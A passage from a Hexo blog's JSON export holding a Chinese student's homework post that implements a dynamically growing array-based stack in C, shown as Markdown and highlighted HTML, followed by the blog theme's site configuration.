s->stacksize=0;\n    return Ok;\n}\nStatus GetTop(SqStack *s, SElemType &e)\n{\n    if(s->top == s->base)return Error;\n    e = *(s->top - 1);\n    return Ok;\n}\nStatus Push(SqStack *s, SElemType e)\n{\n    if(s->top - s->base >= s->stacksize)\n    {\n        s->base = (SElemType *)realloc(s->base, (s->stacksize + STACKINCREMENT) * sizeof(SElemType));\n        if(!s->base)\n        {\n            puts(\"存储空间分配失败！\");\n            return Error;\n        }\n        s->top = s->base + s->stacksize;\n        s->stacksize += STACKINCREMENT;\n    }\n    *s->top++ = e;\n    return Ok;\n}\nStatus Pop(SqStack *s, SElemType *e)\n{\n    if(s->top == s->base)return Error;\n    --s->top;\n    *e = *(s->top);\n    return Ok;\n}\nStatus StackTraverse(SqStack *s,Status(*visit)(SElemType))\n{\n    SElemType *b = s->base;\n    SElemType *t = s->top;\n    while(t > b)visit(*b++);\n    printf(\"\\n\");\n    return Ok;\n}\nStatus visit(SElemType c)\n{\n    printf(\"%d \",c);\n    return Ok;\n}\nvoid stack_insert(SqStack *s)\n{\n    int n;\n    puts(\"请输入要进栈的个数：\");\n    scanf(\"%d\", &n);\n    printf(\"请输入%d个数依次入栈\\n\",n);\n    while(n--)\n    {\n        int m;\n        scanf(\"%d\", &m);\n        Push(s, m);\n    }\n}\nint main()\n{\n    int n;\n    SqStack a;\n    SqStack *s = &a;\n    SElemType e;\n    InitStack(s);\n    stack_insert(s);\n    StackTraverse(s, visit);\n    printf(\"输入1入栈，输入2出栈,输入0退出！\\n\");\n    while(scanf(\"%d\",&n)!=EOF)\n    {\n        if(n==1)stack_insert(s);\n        else if(n==2)\n        {\n            if(StackEmpty(s))printf(\"栈为空！\\n\");\n            else\n            {\n                Pop(s, &e);\n                printf(\"出栈的元素是：%d\\n\", e);\n            }\n        }\n        else break;\n        StackTraverse(s, visit);\n    }\n    Destroy(s);\n    return 0;\n}\n```","source":"_posts/顺序表实现栈.md","raw":"---\ntitle: 顺序表实现栈\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 顺序表\n  - 栈\nabbrlink: 924b455d\nupdated:\n---\n# 顺序表实现栈\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include <stdio.h>\n#include <malloc.h>\ntypedef int SElemType;\ntypedef int Status;\n#define INIT_SIZE 100\n#define STACKINCREMENT 10\n#define Ok 1\n#define Error 0\n#define True 1\n#define False 0\ntypedef struct\n{\n    SElemType *base;\n    SElemType *top;\n    int stacksize;\n}SqStack;\nStatus InitStack(SqStack *s)\n{\n    s->base = (SElemType *)malloc(INIT_SIZE * sizeof(SElemType));\n    if(!s->base)\n    {\n        puts(\"存储空间分配失败！\");\n        return Error;\n    }\n    s->top = s->base;\n    s->stacksize = INIT_SIZE;\n    return Ok;\n}\nStatus ClearStack(SqStack *s)\n{\n    s->top = s->base;\n    return Ok;\n}\nStatus StackEmpty(SqStack *s)\n{\n    if(s->top == s->base)\n        return True;\n    else return False;\n}\nStatus Destroy(SqStack *s)\n{\n    free(s->base);\n    s->base = NULL;\n    s->top = NULL;\n    s->stacksize=0;\n    return Ok;\n}\nStatus GetTop(SqStack *s, SElemType &e)\n{\n    if(s->top == s->base)return Error;\n    e = *(s->top - 1);\n    return Ok;\n}\nStatus Push(SqStack *s, SElemType e)\n{\n    if(s->top - s->base >= s->stacksize)\n    {\n        s->base = (SElemType *)realloc(s->base, (s->stacksize + STACKINCREMENT) * sizeof(SElemType));\n        if(!s->base)\n        {\n            puts(\"存储空间分配失败！\");\n            return Error;\n        }\n        s->top = s->base + s->stacksize;\n        s->stacksize += STACKINCREMENT;\n    }\n    *s->top++ = e;\n    return Ok;\n}\nStatus Pop(SqStack *s, SElemType *e)\n{\n    if(s->top == s->base)return Error;\n    --s->top;\n    *e = *(s->top);\n    return Ok;\n}\nStatus StackTraverse(SqStack *s,Status(*visit)(SElemType))\n{\n    SElemType *b = s->base;\n    SElemType *t = s->top;\n    while(t > b)visit(*b++);\n    printf(\"\\n\");\n    return Ok;\n}\nStatus visit(SElemType c)\n{\n    printf(\"%d \",c);\n    return Ok;\n}\nvoid stack_insert(SqStack *s)\n{\n    int n;\n    puts(\"请输入要进栈的个数：\");\n    scanf(\"%d\", &n);\n    printf(\"请输入%d个数依次入栈\\n\",n);\n    while(n--)\n    {\n        int m;\n        scanf(\"%d\", &m);\n        Push(s, m);\n    }\n}\nint main()\n{\n    int n;\n    SqStack a;\n    SqStack *s = &a;\n    SElemType e;\n    InitStack(s);\n    stack_insert(s);\n    StackTraverse(s, visit);\n    printf(\"输入1入栈，输入2出栈,输入0退出！\\n\");\n    while(scanf(\"%d\",&n)!=EOF)\n    {\n        if(n==1)stack_insert(s);\n        else if(n==2)\n        {\n            if(StackEmpty(s))printf(\"栈为空！\\n\");\n            else\n            {\n                Pop(s, &e);\n                printf(\"出栈的元素是：%d\\n\", e);\n            }\n        }\n        else break;\n        StackTraverse(s, visit);\n    }\n    Destroy(s);\n    return 0;\n}\n```","slug":"顺序表实现栈","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkem004gqse5a3mk5c1n","content":"<h1 id=\"顺序表实现栈\"><a href=\"#顺序表实现栈\" class=\"headerlink\" title=\"顺序表实现栈\"></a>顺序表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> SElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INIT_SIZE 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACKINCREMENT 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Ok 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Error 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> True 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> False 0</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    SElemType *base;</span><br><span class=\"line\">    SElemType *top;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> stacksize;</span><br><span class=\"line\">&#125;SqStack;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitStack</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    s-&gt;base = (SElemType *)<span class=\"built_in\">malloc</span>(INIT_SIZE * <span class=\"keyword\">sizeof</span>(SElemType));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!s-&gt;base)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;存储空间分配失败！&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    s-&gt;top = s-&gt;base;</span><br><span class=\"line\">    s-&gt;stacksize = INIT_SIZE;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">ClearStack</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    s-&gt;top = s-&gt;base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">StackEmpty</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> True;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Destroy</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(s-&gt;base);</span><br><span class=\"line\">    s-&gt;base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    s-&gt;top = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    s-&gt;stacksize=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">GetTop</span><span class=\"params\">(SqStack *s, SElemType &amp;e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)<span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    e = *(s-&gt;top - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Push</span><span class=\"params\">(SqStack *s, SElemType e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top - s-&gt;base &gt;= s-&gt;stacksize)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        s-&gt;base = (SElemType *)<span class=\"built_in\">realloc</span>(s-&gt;base, (s-&gt;stacksize + STACKINCREMENT) * <span class=\"keyword\">sizeof</span>(SElemType));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!s-&gt;base)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;存储空间分配失败！&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        s-&gt;top = s-&gt;base + s-&gt;stacksize;</span><br><span class=\"line\">        s-&gt;stacksize += STACKINCREMENT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *s-&gt;top++ = e;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Pop</span><span class=\"params\">(SqStack *s, SElemType *e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)<span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    --s-&gt;top;</span><br><span class=\"line\">    *e = *(s-&gt;top);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">StackTraverse</span><span class=\"params\">(SqStack *s,Status(*visit)(SElemType))</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    SElemType *b = s-&gt;base;</span><br><span class=\"line\">    SElemType *t = s-&gt;top;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(t &gt; b)visit(*b++);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">visit</span><span class=\"params\">(SElemType c)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,c);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">stack_insert</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;请输入要进栈的个数：&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入%d个数依次入栈\\n&quot;</span>,n);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(n--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> m;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;m);</span><br><span class=\"line\">        Push(s, m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    SqStack a;</span><br><span class=\"line\">    SqStack *s = &amp;a;</span><br><span class=\"line\">    SElemType e;</span><br><span class=\"line\">    InitStack(s);</span><br><span class=\"line\">    stack_insert(s);</span><br><span class=\"line\">    StackTraverse(s, visit);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入1入栈，输入2出栈,输入0退出！\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n)!=EOF)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)stack_insert(s);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(StackEmpty(s))<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈为空！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Pop(s, &amp;e);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;出栈的元素是：%d\\n&quot;</span>, e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        StackTraverse(s, visit);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Destroy(s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2494,"excerpt":"<h1 id=\"顺序表实现栈\"><a href=\"#顺序表实现栈\" class=\"headerlink\" title=\"顺序表实现栈\"></a>顺序表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span 